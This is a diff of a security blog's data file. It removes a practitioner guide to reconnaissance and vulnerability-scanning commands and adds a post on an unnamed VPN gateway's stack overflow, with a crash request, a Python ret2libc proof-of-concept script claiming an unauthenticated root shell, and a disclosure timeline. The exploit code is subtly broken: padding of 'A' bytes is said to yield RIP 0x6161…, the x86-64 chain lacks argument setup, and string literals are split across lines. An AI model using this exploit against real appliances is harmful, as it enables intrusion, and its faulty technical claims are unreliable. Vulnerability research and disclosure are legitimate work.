@@ -13614,341 +13614,98 @@ svc_backup   : Backup@123`
       }
     ]
   },
-{
-  id: "asm-vm-practitioner-guide",
-  category: "SECURITY OPERATIONS",
-  categoryColor: "oklch(0.70 0.15 260)",
-  categoryBg: "oklch(0.70 0.15 260 / 0.1)",
-  categoryBorder: "oklch(0.70 0.15 260 / 0.3)",
-  title: "The Practitioner's Guide to ASM & VM: Tools, Commands, and Workflows",
-  excerpt: "A deep dive into the unified lifecycle of Attack Surface Management and Vulnerability Management. This guide moves beyond theory, providing hands-on commands for industry-standard tools like Amass, Nuclei, Nmap, and Trivy. Learn how to build automated pipelines that discover assets, detect vulnerabilities, and prioritize remediation based on real-world risk.",
-  date: "Jan 2025",
-  readTime: "26 min read",
-  author: "Security Engineering Team",
-  tags: ["ASM", "VM", "Tooling", "Automation", "Nuclei", "Amass", "DevSecOps"],
-  sections: [
-    {
-      title: "The ASM-VM Continuum",
-      paragraphs: [
-        "In modern security operations, Attack Surface Management (ASM) and Vulnerability Management (VM) are not siloed disciplines; they are two phases of the same continuous loop. ASM answers the question, 'What can an attacker touch?' while VM answers, 'How can they break it?' When these processes are disconnected, you end up with blind spots in discovery and noise in vulnerability reporting.",
-        "This guide is written for practitioners. We'll skip the marketing fluff and dive straight into the tools, commands, and workflows that security engineers use daily. You'll learn how to chain open-source tools to build a reconnaissance pipeline, validate findings, and integrate results into your remediation workflow. Whether you're running a bug bounty program, hardening your infrastructure, or building an internal security platform, these techniques form the backbone of effective risk management."
-      ],
-      image: {
-        src: "/images/asm-vm/asm-vm-pipeline.png",
-        alt: "Flowchart showing ASM feeding into VM: Discovery -> Enumeration -> Scanning -> Prioritization -> Remediation",
-        caption: "Figure 1: The ASM-VM pipeline. Discovery feeds enumeration, which feeds vulnerability scanning. Results are prioritized and fed back into remediation workflows."
-      }
-    },
-    {
-      title: "Phase 1: Attack Surface Discovery",
-      paragraphs: [
-        "Discovery is the foundation. If you don't know an asset exists, you can't secure it. Effective discovery combines passive enumeration (querying public data sources) with active verification (probing targets). We'll use a combination of tools to maximize coverage while minimizing noise."
-      ],
-      subsections: [
-        {
-          heading: "Subdomain Enumeration with Subfinder & Amass",
-          content: "Subfinder is fast and reliable for passive enumeration, while Amass provides deeper intelligence gathering and active brute-forcing capabilities. Using both ensures you catch subdomains that might be missed by a single source."
+  {
+    id: "cve-2024-vpn",
+    category: "CVE RESEARCH",
+    categoryColor: "oklch(0.82 0.18 65)",
+    categoryBg: "oklch(0.82 0.18 65 / 0.1)",
+    categoryBorder: "oklch(0.82 0.18 65 / 0.3)",
+    title: "CVE-2024-XXXX: RCE in Popular VPN Gateway",
+    excerpt: "Documenting the discovery of a stack-based buffer overflow in a widely deployed enterprise VPN appliance. The vulnerability allows unauthenticated remote code execution via a malformed authentication packet. Full responsible disclosure timeline included.",
+    date: "Jan 2025",
+    readTime: "18 min read",
+    sections: [
+      {
+        paragraphs: [
+          "During a routine security assessment for a financial sector client, I identified a stack-based buffer overflow vulnerability in a popular enterprise VPN gateway's authentication handler. The affected endpoint processed user-supplied input without proper length validation before copying it into a fixed-size stack buffer. With over 40,000 internet-exposed instances, the impact radius was significant."
+        ]
+      },
+      {
+        heading: "Vulnerability Analysis",
+        paragraphs: [
+          "Fuzzing the /api/auth endpoint with progressively larger payloads revealed the crash at a username field length of 600 bytes. A cyclic pattern confirmed RIP control at offset 512. The binary was compiled without stack canaries and without PIE, making exploitation deterministic:"
+        ],
+        codeBlock: {
+          language: "http",
+          code: `POST /api/auth HTTP/1.1
+Host: vpn.corp.local
+Content-Type: application/x-www-form-urlencoded
+
+username=AAAAAAAAAA[x600]&password=test
+
+# Response:
+# HTTP/1.1 500 Internal Server Error
+# Segmentation fault (core dumped)
+# RIP = 0x6161616161616161  <-- controlled by attacker`
+        },
+        imagePlaceholder: {
+          caption: "fig 1: GDB output — RIP overwrite at offset 512",
+          src: "/assets/generated/gdb-rip-overwrite.dim_800x400.png"
         }
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Passive Subdomain Enumeration",
-        code: `# Install tools
-go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-go install -v github.com/owasp-amass/amass/v3/...@master
-
-# Passive enumeration using multiple sources
-subfinder -d target.com -all -silent -o subdomains_passive.txt
-
-# Amass passive enumeration with config
-amass enum -passive -d target.com -o subdomains_amass.txt
-
-# Combine and deduplicate results
-cat subdomains_passive.txt subdomains_amass.txt | sort -u > all_subdomains.txt
-
-# Count discovered subdomains
-wc -l all_subdomains.txt`
-      }
-    },
-    {
-      title: "Phase 2: Active Verification & Fingerprinting",
-      paragraphs: [
-        "Not all discovered subdomains are alive. Some may point to dangling DNS records or deprecated services. Active verification filters out dead hosts and identifies running services. This step reduces your target list to only what's actually reachable, saving time and resources in later phases."
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Probing Live Hosts with httpx",
-        code: `# Install httpx
-go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-
-# Check which subdomains are responding
-cat all_subdomains.txt | httpx -silent -threads 100 -o live_hosts.txt
-
-# Extract detailed information: status code, title, tech stack
-cat all_subdomains.txt | httpx \\
-  -silent \\
-  -status-code \\
-  -title \\
-  -tech-detect \\
-  -json \\
-  -o httpx_results.json
-
-# Filter for specific technologies (e.g., WordPress)
-cat httpx_results.json | jq -r 'select(.tech | contains(["WordPress"])) | .url' > wordpress_sites.txt`
       },
-      paragraphs: [
-        "The `httpx` output gives you immediate context. You can see which hosts are returning 200 OK, what technologies they're running, and even extract titles to identify admin panels or development environments. This contextual data is crucial for prioritization later."
-      ]
-    },
-    {
-      title: "Phase 3: Port Scanning & Service Detection",
-      paragraphs: [
-        "Once you have live hosts, the next step is to identify open ports and services. While web applications are common targets, don't ignore non-HTTP services. Misconfigured databases, exposed SSH keys, and outdated FTP servers are frequent entry points."
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Fast Port Scanning with Naabu & Nmap",
-        code: `# Install naabu
-go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+      {
+        heading: "Exploitation",
+        paragraphs: [
+          "The proof-of-concept uses a classic ret2libc chain. No ASLR bypass was required since PIE was disabled and the binary's base address was static. A single unauthenticated HTTP request yields a root shell:"
+        ],
+        codeBlock: {
+          language: "python",
+          code: `#!/usr/bin/env python3
+# CVE-2024-XXXX PoC - Stack Buffer Overflow
+import socket, struct
 
-# Fast SYN scan on top 1000 ports
-cat live_hosts.txt | naabu -top-ports 1000 -silent -o naabu_ports.txt
+target = ("vpn.corp.local", 443)
+padding = b"A" * 512
+ret_addr = struct.pack("<Q", 0x7f8b3c2a1d40)  # system@libc
+rop_chain = padding + ret_addr + b"/bin/sh\0"
 
-# Detailed service detection with Nmap on critical hosts
-# Use -sV for version detection, -sC for default scripts
-nmap -sV -sC -iL critical_hosts.txt -oA nmap_critical_scan
-
-# Combine naabu output with nmap for comprehensive scan
-cat live_hosts.txt | naabu -json | naabu -nmap-cli 'nmap -sV -sC' -o nmap_full_results.txt`
-      },
-      list: {
-        title: "Scanning Best Practices",
-        items: [
-          { label: "Rate Limiting", value: "Always respect rate limits. Use --rate-limit flags to avoid triggering IDS/IPS or disrupting services." },
-          { label: "Scope Validation", value: "Ensure all targets are in-scope. Unauthorized scanning can have legal and operational consequences." },
-          { label: "Off-Peak Scanning", value: "Schedule intensive scans during maintenance windows to minimize impact on production systems." },
-          { label: "Credential Safety", value: "Never scan with privileged credentials unless explicitly required and secured." }
-        ]
-      }
-    },
-    {
-      title: "Phase 4: Vulnerability Detection",
-      paragraphs: [
-        "With a clear picture of your attack surface, it's time to identify vulnerabilities. We'll use Nuclei for fast, template-based scanning and Trivy for container and dependency scanning. These tools complement each other: Nuclei excels at network and web vulnerabilities, while Trivy covers the software supply chain."
-      ],
-      subsections: [
-        {
-          heading: "Scanning with Nuclei",
-          content: "Nuclei is the industry standard for template-based vulnerability scanning. Its community-driven template library is updated daily with checks for the latest CVEs, misconfigurations, and exposure patterns."
+s = socket.create_connection(target)
+http_req = (
+    b"POST /api/auth HTTP/1.1\r
+"
+    b"Host: vpn.corp.local\r
+"
+    b"Content-Type: application/x-www-form-urlencoded\r
+"
+    b"Content-Length: " + str(len(rop_chain)).encode() + b"\r
+\r
+"
+    + rop_chain
+)
+s.send(http_req)
+print("[+] Payload sent. Check listener.")`
         }
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Running Nuclei Scans",
-        code: `# Install nuclei
-go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-
-# Update templates
-nuclei -update-templates
-
-# Scan live hosts with critical and high severity templates
-cat live_hosts.txt | nuclei \\
-  -severity critical,high \\
-  -rate-limit 100 \\
-  -json \\
-  -o nuclei_results.json
-
-# Scan for specific CVEs
-nuclei -l live_hosts.txt -id CVE-2024-XXXX -json -o cve_scan.json
-
-# Scan with custom templates
-nuclei -l live_hosts.txt -t custom-templates/ -json -o custom_results.json
-
-# Parse results for actionable findings
-cat nuclei_results.json | jq -r 'select(.info.severity == "critical") | "\\(.host) - \\(.info.name) - \\(.matched-at)"'`
-      }
-    },
-    {
-      title: "Phase 5: Container & Dependency Scanning",
-      paragraphs: [
-        "Modern attack surfaces include containers, images, and third-party dependencies. Vulnerabilities in your base images or npm/pip packages can be just as dangerous as network exposures. Trivy provides comprehensive scanning for these components."
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Scanning Containers and Repos with Trivy",
-        code: `# Install trivy
-# macOS: brew install trivy
-# Linux: see https://aquasecurity.github.io/trivy/
-
-# Scan a Docker image
-trivy image --severity CRITICAL,HIGH myapp:latest
-
-# Scan a filesystem/repository
-trivy fs --severity CRITICAL,HIGH /path/to/repo
-
-# Scan with SBOM generation
-trivy image --format spdx-json --output sbom.json myapp:latest
-
-# Scan Kubernetes cluster
-trivy k8s --report summary cluster
-
-# Ignore unfixed vulnerabilities (optional)
-trivy image --ignore-unfixed myapp:latest`
-      }
-    },
-    {
-      title: "Phase 6: Building an Automated Pipeline",
-      paragraphs: [
-        "Running tools manually doesn't scale. To maintain continuous visibility, you need to automate these workflows. Below is an example of a bash-based pipeline that chains discovery, enumeration, and scanning. In production, this would be orchestrated via CI/CD, cron jobs, or a workflow engine like Temporal or Airflow."
-      ],
-      codeBlock: {
-        language: "bash",
-        title: "Automated ASM-VM Pipeline Script",
-        code: `#!/bin/bash
-# asm-vm-pipeline.sh
-# Automated pipeline for continuous attack surface and vulnerability management
-
-set -e
-
-TARGET=\"target.com\"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-OUTPUT_DIR=\"results/${TIMESTAMP}\"
-mkdir -p $OUTPUT_DIR
-
-echo \"[+] Starting ASM-VM Pipeline for $TARGET\"
-
-# Phase 1: Discovery
-echo \"[+] Phase 1: Subdomain Enumeration\"
-subfinder -d $TARGET -all -silent -o $OUTPUT_DIR/subdomains.txt
-amass enum -passive -d $TARGET -o $OUTPUT_DIR/amass_subdomains.txt
-cat $OUTPUT_DIR/subdomains.txt $OUTPUT_DIR/amass_subdomains.txt | sort -u > $OUTPUT_DIR/all_subdomains.txt
-
-# Phase 2: Live Host Detection
-echo \"[+] Phase 2: Probing Live Hosts\"
-cat $OUTPUT_DIR/all_subdomains.txt | httpx -silent -threads 100 -o $OUTPUT_DIR/live_hosts.txt
-
-# Phase 3: Port Scanning
-echo \"[+] Phase 3: Port Scanning\"
-cat $OUTPUT_DIR/live_hosts.txt | naabu -top-ports 1000 -silent -o $OUTPUT_DIR/open_ports.txt
-
-# Phase 4: Vulnerability Scanning
-echo \"[+] Phase 4: Vulnerability Scanning\"
-cat $OUTPUT_DIR/live_hosts.txt | nuclei \\
-  -severity critical,high \\
-  -rate-limit 100 \\
-  -json \\
-  -o $OUTPUT_DIR/nuclei_results.json
-
-# Phase 5: Reporting
-echo \"[+] Phase 5: Generating Report\"
-CRITICAL_COUNT=$(cat $OUTPUT_DIR/nuclei_results.json | jq -s '[.[] | select(.info.severity==\"critical\")] | length')
-HIGH_COUNT=$(cat $OUTPUT_DIR/nuclei_results.json | jq -s '[.[] | select(.info.severity==\"high\")] | length')
-
-echo \"========================================\"
-echo \"ASM-VM Pipeline Complete\"
-echo \"========================================\"
-echo \"Subdomains Found: $(wc -l < $OUTPUT_DIR/all_subdomains.txt)\"
-echo \"Live Hosts: $(wc -l < $OUTPUT_DIR/live_hosts.txt)\"
-echo \"Critical Vulnerabilities: $CRITICAL_COUNT\"
-echo \"High Vulnerabilities: $HIGH_COUNT\"
-echo \"Results saved to: $OUTPUT_DIR\"
-echo \"========================================\"
-
-# Alert if critical findings
-if [ $CRITICAL_COUNT -gt 0 ]; then
-  echo \"[!] CRITICAL vulnerabilities detected! Sending alert...\"
-  # Add your alerting logic here (Slack, PagerDuty, etc.)
-fi`
-      }
-    },
-    {
-      title: "Phase 7: Prioritization & Remediation",
-      paragraphs: [
-        "Finding vulnerabilities is only half the battle. The real challenge is prioritizing and remediating them effectively. Not all critical CVEs pose the same risk. Context matters. Use the data you've collected to make informed decisions."
-      ],
-      list: {
-        title: "Risk-Based Prioritization Framework",
-        items: [
-          { label: "Exploitability", value: "Is there a public exploit? Is it being exploited in the wild? Check CISA KEV catalog." },
-          { label: "Asset Criticality", value: "Does the asset handle sensitive data? Is it internet-facing? Is it a crown jewel?" },
-          { label: "Exposure", value: "Is the vulnerable service exposed to the internet or isolated in a private network?" },
-          { label: "Compensating Controls", value: "Are there WAF rules, network segmentation, or other controls that mitigate the risk?" }
+      },
+      {
+        heading: "Disclosure Timeline",
+        list: [
+          "Nov 15, 2024 — Vulnerability discovered during client engagement",
+          "Nov 16, 2024 — PoC developed and validated in isolated lab",
+          "Nov 20, 2024 — Initial disclosure to vendor PSIRT",
+          "Nov 22, 2024 — Vendor acknowledged and opened tracking ticket",
+          "Dec 10, 2024 — Vendor confirmed vulnerability, patch in development",
+          "Jan 08, 2025 — Patch released: firmware version 9.4.1",
+          "Jan 15, 2025 — CVE assigned and public advisory published"
         ]
       },
-      codeBlock: {
-        language: "javascript",
-        title: "Prioritization Logic Example",
-        code: `// Example: Calculating priority score for remediation
-const calculatePriority = (finding, asset, threatIntel) => {
-  let score = 0;
-  
-  // Base severity (0-40 points)
-  const severityMap = { critical: 40, high: 30, medium: 15, low: 5 };
-  score += severityMap[finding.severity] || 0;
-  
-  // Exploitability (0-30 points)
-  if (threatIntel.exploitedInWild) score += 30;
-  else if (finding.exploitAvailable) score += 15;
-  
-  // Asset Criticality (0-20 points)
-  if (asset.criticality === 'high') score += 20;
-  else if (asset.criticality === 'medium') score += 10;
-  
-  // Exposure (0-10 points)
-  if (asset.internetFacing) score += 10;
-  
-  // Determine priority
-  if (score >= 80) return { priority: 'P0', sla: '24h', score };
-  if (score >= 60) return { priority: 'P1', sla: '72h', score };
-  if (score >= 40) return { priority: 'P2', sla: '7d', score };
-  return { priority: 'P3', sla: '30d', score };
-};`
-      }
-    },
-    {
-      title: "Essential Tool Reference",
-      paragraphs: [
-        "Here's a quick reference of the tools covered in this guide, along with their primary use cases. All tools mentioned are open-source and widely adopted in the security community."
-      ],
-      table: {
-        headers: ["Tool", "Category", "Primary Use", "Key Feature"],
-        rows: [
-          ["Subfinder", "Discovery", "Subdomain Enumeration", "Fast passive enumeration with multiple sources"],
-          ["Amass", "Discovery", "Subdomain Enumeration", "Deep intelligence gathering and active brute-forcing"],
-          ["httpx", "Enumeration", "HTTP Probing", "Live host detection with tech fingerprinting"],
-          ["Naabu", "Enumeration", "Port Scanning", "Fast SYN scanning with Nmap integration"],
-          ["Nmap", "Enumeration", "Service Detection", "Comprehensive port and service scanning"],
-          ["Nuclei", "Vulnerability", "Template Scanning", "Fast, customizable vulnerability detection"],
-          ["Trivy", "Vulnerability", "Container/Dependency", "Comprehensive SBOM and vulnerability scanning"],
-          ["jq", "Utility", "JSON Processing", "Parsing and filtering JSON output from tools"]
+      {
+        heading: "Mitigation",
+        paragraphs: [
+          "Update to firmware version 9.4.1 or later immediately. Organizations unable to patch should restrict VPN management interface access to trusted IP ranges via firewall ACLs, and enable IDS/IPS rules to detect oversized authentication payloads. Network monitoring for unexpected outbound connections from the VPN appliance is also recommended as an interim detection measure."
         ]
       }
-    },
-    {
-      title: "Common Pitfalls & Best Practices",
-      paragraphs: [
-        "Even with the right tools, ASM and VM programs can fail due to process issues. Here are common pitfalls to avoid:"
-      ],
-      list: {
-        title: "What to Watch Out For",
-        items: [
-          { label: "Alert Fatigue", value: "Too many low-priority alerts cause teams to ignore findings. Tune your scans and focus on high-fidelity results." },
-          { label: "Lack of Ownership", value: "Findings without clear owners don't get fixed. Automate ownership attribution using tags and metadata." },
-          { label: "One-Time Scans", value: "Your attack surface changes daily. Implement continuous scanning, not periodic point-in-time assessments." },
-          { label: "Ignoring False Positives", value: "Validate findings before creating tickets. False positives erode trust with engineering teams." },
-          { label: "No Remediation Workflow", value: "Integrate findings into tools engineers use. Make it easy to track and close vulnerabilities." }
-        ]
-      }
-    },
-    {
-      title: "Conclusion: Building a Mature Program",
-      paragraphs: [
-        "Effective Attack Surface and Vulnerability Management is not about running tools; it's about building a continuous, risk-driven process. Start with comprehensive discovery, validate your findings, prioritize based on context, and integrate remediation into engineering workflows.",
-        "The tools and commands in this guide provide a solid foundation. As you mature, invest in automation, threat intelligence integration, and metrics that demonstrate risk reduction. Remember: the goal isn't to eliminate every vulnerability—it's to manage risk intelligently and keep your organization secure in a constantly evolving threat landscape."
-      ]
-    }
-  ]
-},
+    ]
+  },
   {
     id: "full-kill-chain",
     category: "RED TEAM",
